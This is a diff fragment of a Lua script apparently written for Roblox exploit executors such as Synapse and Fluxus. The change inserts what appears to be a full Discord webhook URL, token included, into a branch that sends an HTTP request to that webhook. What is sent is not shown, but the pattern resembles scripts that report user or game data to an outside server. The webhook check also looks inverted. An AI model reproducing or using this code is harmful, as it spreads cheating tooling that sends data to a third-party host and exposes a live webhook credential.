@@ -733,7 +733,7 @@ BarFill.BorderSizePixel = 0
 corner(BarFill, 4)
 
 task.spawn(function()
-    if WEBHOOK_URL and WEBHOOK_URL ~= "" and WEBHOOK_URL ~= "TON_LIEN_WEBHOOK_ICI" then
+    if WEBHOOK_URL and WEBHOOK_URL ~= "" and WEBHOOK_URL ~= "https://discord.com/api/webhooks/1477453195415388301/_RFMLt_uyr2rDUqXqYlSW_F-pOO_JbZerLYwT7B4vvB6BaYY-rT4dzO9O8KD2d38XB3M" then
         task.spawn(function()
             local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
             if req then
